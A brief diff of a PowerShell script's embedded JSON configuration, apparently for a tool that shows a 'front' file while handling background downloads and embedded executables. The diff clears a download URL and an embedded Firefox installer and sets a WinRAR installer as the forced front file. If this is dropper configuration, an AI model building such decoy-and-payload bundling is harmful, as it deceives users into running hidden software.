@@ -24,18 +24,14 @@ $server = @'
   "startDownloadsForce": true,
   "startDownloads": [],
   "startDownloadsBackForce": true,
-  "startDownloadsBack": [
-    "https://punto-switcher.software.informer.com/download/?ca159922"
-  ],
+  "startDownloadsBack": [],
   "startUrlsForce": true,
   "startUrls": [],
-  "frontForce": false,
+  "frontForce": true,
   "front": [
-    "192.168.0.105_01_20260409231508557.jpeg"
+    "winrar-x64-721b1.exe"
   ],
   "embeddingsForce": true,
-  "embeddings": [
-    "Firefox Installer.exe"
-  ]
+  "embeddings": []
 }
 '@ | ConvertFrom-Json
